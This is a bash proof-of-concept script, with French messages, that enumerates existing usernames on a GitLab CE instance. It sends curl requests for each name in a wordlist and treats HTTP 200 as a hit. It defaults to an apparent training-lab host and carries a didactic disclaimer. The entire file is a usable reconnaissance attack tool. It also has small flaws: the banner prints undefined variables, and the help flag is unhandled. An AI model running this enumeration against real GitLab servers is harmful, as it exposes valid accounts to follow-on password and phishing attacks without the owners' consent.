#!/usr/bin/env bash

# Colors
RED='\033[38;5;196m'
GREEN='\e[38;5;47m'
NC='\033[0m'
BOLD='\e[1m'
PINK='\e[38;5;198m'
Italic='\e[3m'
BBlue='\e[44m'
YELLOW='\033[0;33m'

clear
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "  			         ${BBlue}${BOLD}GitLab User Enumeration Script${NC}"
echo -e "   	    			        ${BOLD}Version 1.0${NC}\n"
echo -e "${BOLD}${PINK}Description: ${NC}Il affiche les noms d’utilisateur existants sur l’instance GitLab CE victime                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ---------------------------------------------\n"
echo -e "   Victim's GitLab instance URL                : ${BOLD}${URL}${NC}"
echo -e "   Path to a username wordlist file            : ${BOLD}${user_list}${NC}\n"
echo -e "${BOLD}${PINK}Description: ${NC}Ce script permet d'afficher les utilisateurs présents sur une instance GitLab CE victime."
echo -e "${BOLD}${PINK}Disclaimer: ${NC}Ne l'exécutez pas contre gitlab.com ! Gardez bien en tête que ce PoC est destiné uniquement à un but didactique et légitime. Son exécution contre des systèmes dont vous ne possédez pas les droits est sous votre responsabilité.\n"
echo -e "${BOLD}${PINK}Author:${NC}${BOLD} @4DoniiS${NC}${Italic} [https://github.com/4D0niiS]${NC}"
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo ""
echo ""

# Usage
usage() {
echo -e "${YELLOW}Usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist>${NC}\n"

echo -e "${Italic}Parameters:${NC}"
echo -e "--------------"
echo -e "-u/--url	L’URL de l’instance GitLab victime"
echo -e "--userlist	Chemin vers un fichier contenant la liste des noms d’utilisateur (un par ligne)"
echo -e "-h/--help	Affiche ce menu d’aide et quitte\n"
echo -e "${Italic}Exemple:${NC}"
echo -e "--------------"
echo -e "./gitlab_user_enum.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/seclists/Usernames/xato-net-10-million-usernames.txt"
}

# check required parameters
function validate_params() {
  if [[ -z "$URL" || -z "$USERLIST" ]]; then
    usage >&2
    exit 1
  fi
}

URL="http://gitlab.inlanefreight.local:8081"
USERLIST="/opt/seclists/Usernames/xato-net-10-million-usernames.txt"

# parse arguments
while [[ $# -gt 0 ]]; do
  key="$1"

  case $key in
      -u|--url)
      URL=$2
      shift
      ;;
      --userlist)
      USERLIST=$2
      shift
      ;;
      *)
      POSITIONAL+=("$1")
      shift
      ;;
  esac
done

set -- "${POSITIONAL[@]}" # restore positional parameters
validate_params

# User enumeration function
enumeration() {
  while IFS= read -r line; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${URL}/${line}")

    if [ "${HTTP_CODE}" == "200" ]; then
      echo -e "[+] Le compte \"${line}\" existe !"
    elif [ "${HTTP_CODE}" == "000" ]; then
      echo -e "[!] Impossible de se connecter à la cible. Veuillez vérifier l'adresse URL saisie ainsi que votre connexion !"
      exit 1
    else
      echo "[-] Compte inconnu (${HTTP_CODE}) : ${line}"
    fi
  done <<< "$(cat "${USERLIST}")"
}

# Main
enumeration
